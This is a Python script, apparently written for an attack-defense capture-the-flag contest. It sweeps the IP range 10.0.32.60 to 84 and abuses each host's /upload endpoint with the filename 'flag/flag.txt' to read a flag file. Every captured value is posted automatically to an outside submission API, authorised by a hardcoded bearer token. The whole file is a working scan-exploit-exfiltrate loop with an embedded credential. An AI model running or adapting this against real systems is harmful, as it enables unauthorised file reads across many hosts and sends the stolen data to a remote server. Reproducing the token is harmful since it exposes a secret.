import requests

# Define the base URL and the IP range
base_url = "http://10.0.32."
port = ":8000/upload"
ip_start = 60
ip_end = 84

# Authorization token for flag submission
auth_token = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyNDI4OTc5NiwianRpIjoiNjg1MjA0ZWMtNDEwYi00YjZlLThlZWMtNDMzYjBjNWJmY2RjIiwidHlwZSI6ImFjY2VzcyIsInN1YiI6eyJ0ZWFtIjp7ImlkIjozNSwibmFtZSI6IkQuSS4gWW9neWFrYXJ0YSJ9fSwibmJmIjoxNzI0Mjg5Nzk2LCJjc3JmIjoiMjE3NTE3ODQtMmM1Zi00OWM3LTkyOGUtNjAwODYzM2Q4NGI3IiwiZXhwIjoxNzI0MzMyOTk2fQ.by66e7Pkas0oGS7pqlabXa4XS2JqXDARwsFllcyeetnG4nlyMbFWI3KpIPUofuynS9E0Qovf2Q50xpCRNBlT_g"

# Define the URL for flag submission
submission_url = "https://and-be.idcyberskills.com/api/v2/submit"

# Iterate over the IP range
for i in range(ip_start, ip_end + 1):
    url = f"{base_url}{i}{port}"
    try:
        # Attempt to upload a file with the name of the flag
        upload_response = requests.post(url, params={"filename": "flag/flag.txt"}, timeout=5)  # Adding timeout
        
        # Print the URL and the response from the server
        print(f"URL: {url}")
        print("Response:", upload_response.text)
        print("-" * 50)
        
        # Assuming the response contains a flag, send it to the submission endpoint
        if "flag" in upload_response.text.lower():  # Check if the response contains the word "flag"
            flag = upload_response.text.strip()  # Extract the flag (may need adjustment based on actual response format)
            data = {"flags": [flag]}
            
            # Send the flag to the submission endpoint
            submission_response = requests.post(
                submission_url,
                headers={
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {auth_token}'
                },
                json=data
            )
            
            # Print the response from the flag submission
            print(f"Flag submitted from {url}")
            print("Submission Response:", submission_response.text)
            print("-" * 50)
        
    except requests.exceptions.RequestException as e:
        # Handle any request errors (e.g., server down, connection refused)
        print(f"Failed to connect to {url}, skipping to the next IP.")
        print(f"Error: {e}")
        print("-" * 50)
        continue  # Ensure that the script continues to the next IP
